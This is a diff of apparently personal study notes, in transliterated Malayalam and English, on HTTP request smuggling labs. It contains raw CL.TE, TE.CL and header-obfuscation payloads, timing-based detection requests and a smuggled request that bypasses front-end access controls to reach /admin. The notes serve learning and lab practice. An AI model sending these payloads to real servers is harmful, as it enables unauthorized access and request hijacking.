@@ -3,22 +3,22 @@
 -->HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins
 -->The `Content-Length` header is straightforward: it specifies the length of the message body in bytes ie, 
 
-                   POST /search HTTP/1.1 
-                   Host: normal-website.com 
-                   Content-Type: application/x-www-form-urlencoded 
-                   Content-Length: 11 
+POST /search HTTP/1.1 
+Host: normal-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 11 
                    
-                   q=smuggling
+q=smuggling
 
 -->The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:
 
-                   Host: normal-website.com 
-                   Content-Type: application/x-www-form-urlencoded 
-                   Transfer-Encoding: chunked 
+Host: normal-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Transfer-Encoding: chunked 
                    
-                   b 
-                   q=smuggling 
-                   0
+b 
+q=smuggling 
+0
 -->Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently
 -->The exact way in which this is done depends on the behavior of the two servers:
  -   CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
@@ -30,14 +30,14 @@
 ### #1 CL.TE vulnerabilities:
 -->Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:
 
-               POST / HTTP/1.1 
-               Host: vulnerable-website.com 
-               Content-Length: 13 
-               Transfer-Encoding: chunked 
+POST / HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Length: 13 
+Transfer-Encoding: chunked 
                
-               0 
+0 
                
-               SMUGGLED
+SMUGGLED
 
 -->ivide backend smuggeled ennanth puthiya request aayi kanunu
 
@@ -46,16 +46,16 @@
  -->so ivide homepage load chyuka.enit athinte GET / request eduth repeater il iduka
  -->aa request ile url path um host: header um ozhichu baaki elam remove chyuka enit ith add chyuka :
 
-                      POST / HTTP/1.1 
-                      Host: your-lab-id.web-security-academy.net 
-                      Connection: keep-alive 
-                      Content-Type: application/x-www-form-urlencoded 
-                      Content-Length: 6 
-                      Transfer-Encoding: chunked 
+POST / HTTP/1.1 
+Host: your-lab-id.web-security-academy.net 
+Connection: keep-alive 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 6 
+Transfer-Encoding: chunked 
                       
-                      0 
+0 
                       
-                      G
+G
 
 -->enit GET ennath maati POST aakuka. enit send chyuka.apol response ok varum.ini onudi send chyuka apol error varunath kanam `"Unrecognized method GPOST"`  athinartham body il g enna kidakuna sathanam adutha puthiya request il aan vannath
 
@@ -79,7 +79,7 @@
 
              Lab-2(HTTP request smuggling, basic TE.CL vulnerability)
  -->ivde aadyam manasilakendath front end server chunked header aan support chyuka. athupole backend content-length header aan support chyuka
- -->so eth request smuggling chyumbozhum namal aadyam front end server kadan pokenda karyaman aadyam nokenda
+ -->so eth request smuggling chyumbozhum namal aadyam front end server kadan pokenda karyaman aadyam nokendath
  -->so ivide front end chunked support chyunu.so last 0 varunath vere namude request body undayirikanam.ath mathramala.==zero kk shesham rand empty line um thazhe aayi venam==
  -->so namal GET /  request edukunu enit athil url , host header ozhich baaki elam remove chyunu.enit namuk venda headers idunu enit test chyam
 
@@ -101,19 +101,19 @@ abcde
 -->so ini onnukoode send chythal ee abcde ennath response il append chythathayi kanam
 -->ini final payload nokam :
 
-									POST / HTTP/1.1
-									Host: your-lab-id.web-security-academy.net
-									Content-Type: application/x-www-form-urlencoded
-									Content-length: 4
-									Transfer-Encoding: chunked
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
 									
-									5c
-									GPOST / HTTP/1.1
-									Content-Type: application/x-www-form-urlencoded
-									Content-Length: 15
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
 									
-									x=1
-									0
+x=1
+0
 
 
 -->0 kk shesham rand empty line iduka ok
@@ -165,20 +165,20 @@ as
 -->so namuk rand transfer-encoding header use chyam.onil chunked value kodukam mattethil enthengilum kodutho
 -->full payload:
 
-                    POST / HTTP/1.1
-					Host: your-lab-id.web-security-academy.net
-					Content-Type: application/x-www-form-urlencoded
-					Content-length: 4
-					Transfer-Encoding: chunked
-					Transfer-encoding: cow
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cat
 					
-					5c
-					GPOST / HTTP/1.1
-					Content-Type: application/x-www-form-urlencoded
-					Content-Length: 15
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
 					
-					x=1
-					0
+x=1
+0
 
 
 -->ingnae request il koduth send adikuka apol 200OK varum.onukoode send adichal "Unrecognized method GPOST"  enn kanikum apol lab solve aakum
@@ -189,27 +189,27 @@ as
 -->The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present
 -->If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:
 
-										POST / HTTP/1.1
-										Host: vulnerable-website.com
-										Transfer-Encoding: chunked
-										Content-Length: 4
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
 										
-										1
-										A
-										X
+1
+A
+X
 
 -->Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.
 
 -->If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:
 
-                                    POST / HTTP/1.1
-									Host: vulnerable-website.com
-									Transfer-Encoding: chunked
-									Content-Length: 6
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
 									
-									0
+0
 									
-									X
+X
 -->Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.
 -->te.cl testing application il ulla mattu users ine bhadhikam.so first namal CL.TE test chyth nokuka.enit mathrame TE.CL test chyth nokavu
 
@@ -221,16 +221,16 @@ as
 -->namuk ariyam (sherikum namuk areela but ith lab aayond ariyam) front end content-length support chyum.so 35 enn length kodukunu.backend transfer-encoding support chyunu
 -->final payload :
 
-                            POST / HTTP/1.1
-							Host: your-lab-id.web-security-academy.net
-							Content-Type: application/x-www-form-urlencoded
-							Content-Length: 35
-							Transfer-Encoding: chunked
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
 							
-							0
+0
 							
-							GET /404 HTTP/1.1
-							X-Ignore: X
+GET /404 HTTP/1.1
+X-Ignore: X
 
 -->ivide front end C.L support chyunath kond request ile ellam edukunu.but backen il chunked mathrame support chyu.so 0 kk shesham ullath next request aayi kanunu
 -->ivide lab solve chyanamengil smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response. 
@@ -243,18 +243,18 @@ as
 ### Bypass front-end security controls :
 -->Suppose the current user is permitted to access `/home` but not `/admin`. They can bypass this restriction using the following request smuggling attack:
 
-                                POST /home HTTP/1.1
-								Host: vulnerable-website.com
-								Content-Type: application/x-www-form-urlencoded
-								Content-Length: 62
-								Transfer-Encoding: chunked
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
 								
-								0
+0
 								
-								GET /admin HTTP/1.1
-								Host: vulnerable-website.com
-								Foo: xGET /home HTTP/1.1
-								Host: vulnerable-website.com
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
 
 -->ivide ee request back endil ethumbol back end ithine rand request aayi kanum.ivide /admin enna request elavarkum accessible alla.access control restriction application use chyunund
 -->so ingane smuggling vazhi chyumbol application vijarikum ee /admin enna request real aayi vannathanen. athayath It assumes that the requests have passed through the front-end controls, and so grants access to the restricted URL.
@@ -418,9 +418,9 @@ as
 
 ==============================================================
 
-### Bypassing client side fileters
+### Bypassing client side filters
 --> chela samayangalil servers clientumayi(browser) authenticate chyunath certificate vechitan. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain
--->Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism
+-->Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, wh ich can be used in the back-end application logic as part of an access control mechanism
 -->For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:
 
                       GET /admin HTTP/1.1 
